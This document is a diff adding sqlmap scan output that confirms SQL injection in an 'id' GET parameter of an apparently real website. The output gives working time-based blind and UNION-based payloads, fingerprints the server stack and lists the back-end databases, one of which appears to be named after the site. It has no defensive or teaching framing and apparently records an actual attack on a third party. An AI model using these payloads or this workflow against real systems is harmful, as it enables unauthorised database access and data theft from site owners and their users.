@@ -1,0 +1,18 @@
+sqlmap identified the following injection point(s) with a total of 100 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=-2384 UNION ALL SELECT NULL,CONCAT(0x716b706b71,0x616141436946554e72466d6b6f714872666374426d675748536e66704e715951625070534450617a,0x71716b6271),NULL,NULL-- YTsI
+---
+web server operating system: Linux SuSE 10.3
+web application technology: Apache 2.2.4
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] www-chengyu-cy-com
+
